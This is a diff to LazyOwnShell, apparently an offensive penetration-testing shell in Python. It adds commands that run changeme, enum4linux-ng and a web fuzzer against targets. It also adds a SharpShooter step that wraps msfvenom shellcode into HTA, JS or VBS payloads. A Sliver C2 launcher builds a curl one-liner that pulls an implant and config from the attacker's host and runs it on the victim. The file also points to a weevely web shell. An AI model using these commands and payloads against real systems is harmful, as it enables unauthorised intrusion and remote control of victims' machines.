@@ -3168,6 +3168,17 @@ class LazyOwnShell(Cmd):
             - If `gospider` is not installed, the method will attempt to install it.
             - Ensure that the network and tools are configured correctly for successful execution.
         """
+        cmd = f"""{RED}
+            ──▐─▌──▐─▌──
+            ─▐▌─▐▌▐▌─▐▌─
+            ─█▄▀▄██▄▀▄█─
+            ──▄──██▌─▄──
+            ▄▀─█▀██▀█─▀▄
+            ▐▌▐▌─▐▌─▐▌▐▌
+            ─▐─█────█─▌─
+            ────▌──▐────
+        """
+        print_msg(cmd)
         rhost = self.params["rhost"]
         if line == "url":
             url = self.params["url"]
@@ -3179,6 +3190,8 @@ class LazyOwnShell(Cmd):
 
             print_msg(f"Try gospider -s {url}")
             os.system(f"gospider -s {url}")
+
+            print_msg(cmd)
             return
 
         if not check_rhost(rhost):
@@ -3186,11 +3199,13 @@ class LazyOwnShell(Cmd):
         if is_binary_present("gospider"):
             print_msg(f"try... gospider -s http://{rhost}")
             os.system(f"gospider -s http://{rhost}")
+            print_msg(cmd)
         else:
             print_msg(
                 "gospider is not installed, installing... (control + c to cancel)"
             )
             os.system(f"sudo apt install gospider -y && gospider -s http://{rhost}")
+            print_msg(cmd)
 
     def do_arpscan(self, line):
         """
@@ -4726,6 +4741,7 @@ class LazyOwnShell(Cmd):
             ("locate backup files", "locate backup"),
             ("locate dump files", "locate dump"),
             ("locate priv files", "locate priv"),
+            ("lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
             ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
             ("WIN List Directory", "dir"),
             ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
@@ -9099,6 +9115,258 @@ class LazyOwnShell(Cmd):
             print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
             return
         return
+
+    def do_changeme(self, line):
+        """
+        Executes a changeme scan on a specified target URL or host.
+
+        Usage:
+            changeme [-o <output file>] --oa -t 20 rhost
+
+        If a URL is provided as an argument, it will be used as the target for the scan.
+        Otherwise, it will use the target specified in self.params["rhost"].
+        """
+        if not is_binary_present("changeme"):
+            print_warn("Installing changeme...")
+            os.system("sudo apt install changeme -y")
+            
+        if line:
+            rhost = line
+        else:
+            rhost = self.params["rhost"]
+            if not check_rhost(rhost):
+                return
+        
+        output_file = f"sessions/{rhost}_changeme_output"
+        cmd = ["changeme", "-a", "-o", output_file, "--oa", "-t", "20", rhost]
+        try:
+            subprocess.run(cmd, check=True)
+           
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error running changeme scan: {e}")
+        return
+
+    def do_enum4linux_ng(self, line):
+        """
+        Performs enumeration of information from a target system using `enum4linux-ng`.
+
+        1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.
+
+        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
+        :param rhost: The target host for enumeration, specified in the `params` dictionary.
+
+        :returns: None
+
+        Manual execution:
+        To manually enumerate information from a system, use the following command:
+            enum4linu-ng -A <target_host>
+
+        Replace `<target_host>` with the IP address or hostname of the target system.
+
+        For example:
+            enum4linux-ng -A 192.168.1.10
+        """
+
+        if not is_binary_present("enum4linux-ng"):
+            print_warn("Installing enum4linux-ng...")
+            os.system("sudo apt install enum4linux-ng -y")
+
+        if line:
+            rhost = line
+        else:
+            rhost = self.params["rhost"]
+            if not check_rhost(rhost):
+                return
+
+        rhost = self.params["rhost"]
+        print_msg(f"Try... enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng {RESET}")
+        os.system(f"enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng")
+        return
+
+    def do_fuzz(self, line):
+        """
+        Executes a web server fuzzing script with user-provided parameters.
+
+        This function prompts the user for the necessary parameters to run the fuzzing script,
+        including the target IP, port, HTTP method, directory, file extension, and expected status codes.
+
+        Usage:
+            fuzzing
+
+        Parameters:
+            line (str): The command line input for the function (not used directly in the current implementation).
+
+        Returns:
+            None
+
+        Example:
+            To run the fuzzing script, enter the required parameters when prompted by the function.
+        """
+
+        if not is_binary_present("closed_source_web_server_fuzz"):
+            print_warn("Installing closed_source_web_server_fuzz...")
+            os.system("sudo apt install spike -y")
+
+        if line:
+            rhost = line
+        else:
+            rhost = self.params["rhost"]
+            if not check_rhost(rhost):
+                return
+        target_port = input("    [!] Enter the target port: ")
+        http_method = input("    [!] Enter the HTTP method (e.g., GET, POST): ")
+        directory = input("    [!] Enter the directory to fuzz (e.g., /): ")
+        file_extension = input("    [!] Enter the file extension to test (e.g., .php, .asp): ")
+        additional_extension = input("    [!] Enter any additional file extension (e.g., .zip): ")
+        status_code_1 = input("    [!] Enter the first expected status code (e.g., 200, 404): ")
+        status_code_2 = input("    [!] Enter the second expected status code (if any, otherwise leave blank): ")
+
+        cmd = f"closed_source_web_server_fuzz {rhost} {target_port} {http_method} {directory} {file_extension} {additional_extension} {status_code_1} {status_code_2}"
+
+        print_msg(f"Try... {cmd} {RESET}")
+        os.system(cmd)
+        return
+
+    def do_sharpshooter(self, line):
+        """
+        Executes a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
+        SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS, and WSF.
+
+        Usage:
+            sharpshooter [-o <output file>] --oa -t 20 rhost
+
+        This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
+        and then runs SharpShooter to create a payload based on the specified type.
+
+        Parameters:
+            line (str): The command line input for the function (not used directly in the current implementation).
+
+        Returns:
+            None
+
+        Example:
+            To create a payload using SharpShooter, ensure you have already generated shellcode using lazymsfvenom or venom,
+            and then run this function to specify the payload type and generate the final payload file.
+        """
+        if not is_binary_present("sharpshooter"):
+            print_warn("Installing sharpshooter...")
+            os.system("sudo apt install sharpshooter -y")
+        
+        path = os.getcwd()
+        file = f"{path}/sessions/shellcode.bin"
+
+        if not os.path.exists(file):
+            print_error(f"You need to run the lazymsfvenom or venom command and choose a payload before running sharpshooter to create {file}.")
+            return
+
+        payload_type = input("    [!] Enter Payload type: hta, js, jse, vbe, vbs, wsf: ")
+
+        cmd = f"sharpshooter --stageless --payload {payload_type} --output sessions/payload_{payload_type} --dotnetver 2 --rawscfile {file}"
+        try:
+            os.system(cmd)
+        except e:
+            print_error(f"Error running sharpshooter scan: {e}")
+        return
+
+    def do_sliver_server(self, line):
+        """
+        Starts the Sliver server and generates a client configuration file for connecting clients.
+        Provides options to download the Sliver client for Windows, Linux, or macOS.
+
+        Usage:
+            sliver-server [flags]
+            sliver-client [command]
+
+        This function installs Sliver if it is not already installed, starts the Sliver server,
+        generates the necessary certificates, and creates a client configuration file. 
+        It also provides options to download the client for different operating systems.
+
+        Parameters:
+            line (str): The command line input for the function (not used directly in the current implementation).
+
+        Returns:
+            None
+
+        Example:
+            To start the Sliver server, generate the necessary certificates, and download the client,
+            run this function. Choose the appropriate client download option based on the operating system.
+        """
+        if not is_binary_present("sliver-server"):
+            print_warn("Installing sliver-server...")
+            os.system("sudo apt install sliver-server -y")
+        
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+
+        lhost = self.params["lhost"]
+        if not check_lhost(lhost):
+            return
+  
+        lport = self.params["lport"]
+        if not check_lport(lport):
+            return       
+
+        if not line:
+            print_error("You need pass hte name of the victim")
+            return
+
+        server_port = self.params["lport"]
+
+        print_msg("download the sliver client")
+        time.sleep(3)
+
+        p.onecmd("download_resources")
+
+        print_msg("Choose the client to download:")
+        print_msg("1. Windows")
+        print_msg("2. Linux")
+        print_msg("3. macOS")
+
+        choice = input("Enter your choice (1, 2, or 3): ")
+        if choice == "1":
+            download_url = f"http://{lhost}/sliver-client_windows.exe"
+            name = "sliver.exe"
+        elif choice == "2":
+            download_url = f"http://{lhost}/sliver-client_linux"
+            name = "sliver"
+        elif choice == "3":
+            download_url = f"http://{lhost}/sliver-client_macos"
+            name = "sliver"
+        else:
+            print_error("Invalid choice.")
+            return
+        os.system("cd sessions && chmod +x sliver* && upx sliver*")
+        print_msg(f"Copy Download client command {download_url}...")
+        try:
+            cmd = f"curl -o {name} {download_url} && curl -o config.cfg http://{lhost}/{line}_file.cfg && chmod +x {name} && ./{name} import config.cfg && ./{name}"
+            copy2clip(cmd)
+        except Exception as e:
+            print_error(f"Error copy: {e}")
+
+        print_msg("Starting the Sliver server...")
+        cmd = "cd sessions && sliver-server"
+        try:
+            os.system(f"sliver-server operator -l {lhost} -p {lport} -n {line} -s sessions/{line}_file.cfg")
+            os.system(cmd)
+            print_msg("Sliver server started successfully.")
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error starting Sliver server: {e}")
+            return
+
+        return
+    
+    def do_gencert(self, line):
+        """
+        Generates a certificate authority (CA), client certificate, and client key.
+        
+        Returns:
+            str: Paths to the generated CA certificate, client certificate, and client key.
+        """
+        generate_certificates()
+        os.system("mv *.pem sessions")
+        return
+        
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
